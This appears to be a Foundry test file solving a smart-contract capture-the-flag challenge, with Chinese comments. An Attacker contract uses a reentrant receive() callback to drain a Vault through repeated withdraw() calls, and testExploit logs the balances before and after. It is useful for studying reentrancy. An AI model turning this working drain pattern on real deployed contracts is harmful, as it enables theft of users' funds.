// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
    import "forge-std/console2.sol";
import "../src/Vault.sol";

// 攻击合约
contract Attacker {
    Vault public vault;

    constructor(address payable _vault) {
        vault = Vault(_vault);
    }

    // 存款函数
    function deposit() external payable {
        vault.deposite{value: msg.value}();
    }

    // 开始攻击
    function attack() external {
        vault.withdraw();
    }

    // 接收ETH时触发重入攻击
    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vault.openWithdraw();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        Attacker attacker = new Attacker(payable(address(vault)));
        vm.startPrank(palyer);

        attacker.deposit{value: 0.01 ether}();
        // 4. 执行攻击
        console2.log("vault before balance", address(vault).balance);
        attacker.attack();
        console2.log("vault after balance", address(vault).balance);
        console2.log("palyer balance", address(palyer).balance);
        console2.log("attacker balance", address(attacker).balance);

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}
